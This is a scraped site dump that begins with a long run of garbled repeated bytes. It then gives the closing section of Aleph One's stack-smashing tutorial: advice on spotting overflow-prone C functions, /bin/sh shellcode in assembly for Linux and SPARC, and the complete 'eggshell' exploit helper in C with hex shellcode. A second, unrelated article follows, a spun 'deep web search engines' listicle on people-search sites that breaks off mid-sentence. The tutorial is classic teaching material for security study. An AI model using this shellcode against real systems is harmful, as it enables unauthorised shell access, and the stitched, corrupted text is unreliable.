\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff \u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4 \u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0 \u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf \u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff \u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4 \u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf \u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4 Warning: some arguments in previous message were lost $ ------------------------------------------------------------------------------ On the first try! It has certainly increased our odds. Depending how much environment data the exploit program has compared with the program you are trying to exploit the guessed address may be to low or to high. Experiment both with positive and negative offsets. Finding Buffer Overflows ~~~~~~~~~~~~~~~~~~~~~~~~ As stated earlier, buffer overflows are the result of stuffing more information into a buffer than it is meant to hold. Since C does not have any built-in bounds checking, overflows often manifest themselves as writing past the end of a character array. The standard C library provides a number of functions for copying or appending strings, that perform no boundary checking. They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions operate on null-terminated strings, and do not check for overflow of the receiving string. gets() is a function that reads a line from stdin into a buffer until either a terminating newline or EOF. It performs no checks for buffer overflows. The scanf() family of functions can also be a problem if you are matching a sequence of non-white-space characters (%s), or matching a non-empty sequence of characters from a specified set (%[]), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of characters, and you have not defined the optional maximum field width. If the target of any of these functions is a buffer of static size, and its other argument was somehow derived from user input there is a good posibility that you might be able to exploit a buffer overflow. Another usual programming construct we find is the use of a while loop to read one character at a time into a buffer from stdin or some file until the end of line, end of file, or some other delimiter is reached. This type of construct usually uses one of these functions: getc(), fgetc(), or getchar(). If there is no explicit checks for overflows in the while loop, such programs are easily exploited. To conclude, grep(1) is your friend. The sources for free operating systems and their utilities is readily available. This fact becomes quite interesting once you realize that many comercial operating systems utilities where derived from the same sources as the free ones. Use the source d00d. Appendix A - Shellcode for Different Operating Systems/Architectures ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ i386/Linux ------------------------------------------------------------------------------ jmp 0x1f popl %esi movl %esi,0x8(%esi) xorl %eax,%eax movb %eax,0x7(%esi) movl %eax,0xc(%esi) movb $0xb,%al movl %esi,%ebx leal 0x8(%esi),%ecx leal 0xc(%esi),%edx int $0x80 xorl %ebx,%ebx movl %ebx,%eax inc %eax int $0x80 call -0x24 .string \\\"/bin/sh\\\" ------------------------------------------------------------------------------ SPARC/Solaris ------------------------------------------------------------------------------ sethi 0xbd89a, %l6 or %l6, 0x16e, %l6 sethi 0xbdcda, %l7 and %sp, %sp, %o0 add %sp, 8, %o1 xor %o2, %o2, %o2 add %sp, 16, %sp std %l6, [%sp - 16] st %sp, [%sp - 8] st %g0, [%sp - 4] mov 0x3b, %g1 ta 8 xor %o7, %o7, %o0 mov 1, %g1 ta 8 ------------------------------------------------------------------------------ SPARC/SunOS ------------------------------------------------------------------------------ sethi 0xbd89a, %l6 or %l6, 0x16e, %l6 sethi 0xbdcda, %l7 and %sp, %sp, %o0 add %sp, 8, %o1 xor %o2, %o2, %o2 add %sp, 16, %sp std %l6, [%sp - 16] st %sp, [%sp - 8] st %g0, [%sp - 4] mov 0x3b, %g1 mov -0x1, %l5 ta %l5 + 1 xor %o7, %o7, %o0 mov 1, %g1 ta %l5 + 1 ------------------------------------------------------------------------------ Appendix B - Generic Buffer Overflow Program ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shellcode.h ------------------------------------------------------------------------------ #if defined(__i386__) && defined(__linux__) #define NOP_SIZE 1 char nop[] = \"\\x90\"; char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } #elif defined(__sparc__) && defined(__sun__) && defined(__svr4__) #define NOP_SIZE 4 char nop[]=\"\\xac\\x15\\xa1\\x6e\"; char shellcode[] = \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\" \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\" \"\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\" \"\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\"; unsigned long get_sp(void) { __asm__(\"or %sp, %sp, %i0\"); } #elif defined(__sparc__) && defined(__sun__) #define NOP_SIZE 4 char nop[]=\"\\xac\\x15\\xa1\\x6e\"; char shellcode[] = \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\" \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\" \"\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\xaa\\x10\\x3f\\xff\" \"\\x91\\xd5\\x60\\x01\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd5\\x60\\x01\"; unsigned long get_sp(void) { __asm__(\"or %sp, %sp, %i0\"); } #endif ------------------------------------------------------------------------------ eggshell.c ------------------------------------------------------------------------------ /* * eggshell v1.0 * * Aleph One / aleph1@underground.org */ #include <stdlib.h> #include <stdio.h> #include \"shellcode.h\" #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define DEFAULT_EGG_SIZE 2048 void usage(void); void main(int argc, char *argv[]) { char *ptr, *bof, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE; while ((c = getopt(argc, argv, \"a:b:e:o:\")) != EOF) switch (c) { case 'a': align = atoi(optarg); break; case 'b': bsize = atoi(optarg); break; case 'e': eggsize = atoi(optarg); break; case 'o': offset = atoi(optarg); break; case '?': usage(); exit(0); } if (strlen(shellcode) > eggsize) { printf(\"Shellcode is larger the the egg.\\n\"); exit(0); } if (!(bof = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } if (!(egg = malloc(eggsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"[ Buffer size:\\t%d\\t\\tEgg size:\\t%d\\tAligment:\\t%d\\t]\\n\", bsize, eggsize, align); printf(\"[ Address:\\t0x%x\\tOffset:\\t\\t%d\\t\\t\\t\\t]\\n\", addr, offset); addr_ptr = (long *) bof; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr = egg; for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE) for (n = 0; n < NOP_SIZE; n++) { m = (n + align) % NOP_SIZE; *(ptr++) = nop[m]; } for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; bof[bsize - 1] = '\\0'; egg[eggsize - 1] = '\\0'; memcpy(egg,\"EGG=\",4); putenv(egg); memcpy(bof,\"BOF=\",4); putenv(bof); system(\"/bin/sh\"); } void usage(void) { (void)fprintf(stderr, \"usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>]\\n\"); } ------------------------------------------------------------------------------ \u539f\u6587\u94fe\u63a5\uff1a https://insecure.org/stf/smashstack.html","title":"Smashing the Stack for Fun and Profit by Aleph One"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/","text":"TOP 11 Deep Web Search Engine Alternative for Google and Bing 2021 [ Deep Web Search Engine is an alternative search engine when we need to search something, then Google or Bing will the first choice hit in mind suddenly. But unlike the Deep Web Search Engine, Google and Bing will not give all the Hidden information which is served under the Dark web . Google has the ability to track your each and every move on the Internet while you are searching via Google.. If you don\u2019t want Google to collect your personal information and your online activities you should maintain your Anonymity online. \u201cDeep web\u201d Also known as \u201cinvisible web\u201d, the term refers to a vast repository of underlying content, such as documents in online databases that general-purpose web crawlers cannot reach. The deep web content is estimated at 500 times Bigger than Normal search contents, yet has remained mostly untapped due to the limitations of traditional search engines. Since most personal profiles, public records and other people-related documents are stored in databases and not on static web pages, most of the higher-quality information about people is simply \u201cinvisible\u201d to a regular search engine but we can get it from Deep Web Search Engine. Why doesn\u2019t Google provide Deep web Search Results? Basically, Deep web or Dark Web secret contents Don\u2019t index to provide Results by normal Search Engines such as Google and Bing. all the Deb websites (.onion) are unindexed but few results we can crawl via Deep Web Search Engine. Google will not provide Search results which don\u2019t index by world wide web.The content is hidden behind HTML forms. Regular searches which you are searching by google and its result re-drive from interconnected servers and content publishers are optimizing their content by learning best search engine optimization training to provide a better result for google search users. (adsbygoogle=window.adsbygoogle||[]).push({}); When you access the dark web, you\u2019re not surfing the interconnected servers you regularly interact with; instead, everything stays internal on the Tor network, which provides security and privacy to everyone equally. \u201cAccording to the Researchers, only 4 % of the Internet is visible to the general public and remaining 96% of Website and Data\u2019s hidden behind the Deep web\u201d Deep web contains many illegal Activities including Drugs, Weapon Dealing, highly sophisticated hacking tools, Illegal Pornography, Government Military secret, and other illegal Actives. Robots Exclusion: The robots.txt document, which more often than not lives in the principle catalog of a site, tells seek robots which records and registries, files and directories should not be indexed. Henceforth the name \u201crobots Exclusion Files.\u201d If this record is set up, it will hinder certain pages from being listed, which will then be imperceptible to searchers. Blog stages normally offer this component. Here we go for the interesting Search Engines to get the deep search results which are probably most of the Peoples Don\u2019t aware. Also Read: TOR and VPN Anonymous enough for Dark Web Deep Web Search Engines 2021 1.pipl Pipl\u2019s query-engine helps you find deep web pages that cannot be found on regular search engines. Unlike other searching Engines link Google and Bing, pipl Deep Web Search Engine provide search results retrieved from Deep Web. Pipl robots are set to interact with searchable databases and extract facts, contact details and other relevant information from personal profiles, member directories, scientific publications, court records and numerous other deep-web sources. According to pipl , they using advanced language-analysis and ranking algorithms to bring you the most relevant bits of information about a person in a single, easy-to-read results page. 2. My Life A Mylife Deep Web Search Engine Public Page can list a person\u2019s data including age, past and current places of residence, telephone numbers, email addresses, employments, instruction, photos, relatives, a smaller than expected history and an individual survey segment which urges other Mylife individuals to rate each other. You can register for this service and get a fair amount of information for free but for $6.95 US Dollars, you can use the service for a month and get full reports and all kinds of juicy information. Mylife cases to have \u201cmore than 225 million Public Pages with data about practically everybody in America, 18 years of age and over.\u201d According to MyLife, an \u201cOpen Page can\u2019t be erased\u201d and \u201cjust premium individuals can conceal content on their Public Page and expel the information from the first source. 3. Yippy Yippy in fact a Metasearch Engine (it gets its outcomes by utilizing other web indexes), I\u2019ve included Yippy here as it has a place with an entryway of devices a web client might be occupied with, for example, such as email, games, videos and so on. Yippy cases to be a family cordial site and particular of protection(Privacy). Not at all like Google they don\u2019t store your history, look terms or email which is an or more point, yet the traditionalist family well-disposed picture has influenced seek quality. They assert 5 million \u201cundesirable\u201d sites have been blocked from its index to protect sensitive searchers. A search for [alcohol] returns results of alcoholics, anonymous groups, rather than say, a Wikipedia page on what alcohol is for example. So Yippy is no good for people looking for information but may be of interest to parents of laptop owning children. 4. Surfwax SurfWax Deep Web Search Engine is available as a free and a subscription-based service. The search site is bundled with a number of features other than plain search. The features include: \u201cFocus\u201d link to add \u201cfocus words\u201d that you can add to the search. The focus words are narrower or broader terms that can be used to expand or narrow your search. \u201cSiteSnaps\u201d highlight ( an amplifying glass symbol to one side of the outcome ) for getting a rundown of the website page and furthermore to recognize what terms the motor considered as pertinent \u201cResultStats\u201d highlight to have the measurements on the wellspring of the considerable number of results and the time it took to recover the outcomes. According to Surfwax, On waves, surf wax helps surfers grip their surfboard; for Web surfing, SurfWax helps you get the best grip on information \u2014 providing the \u201cbest use\u201d of relevant search results. Deep Web Search Engine SurfWax\u2019s design/UI was the first to make searching a \u201cvisual process,\u201d seamlessly integrating meaning-based search with key knowledge-finding elements for effective 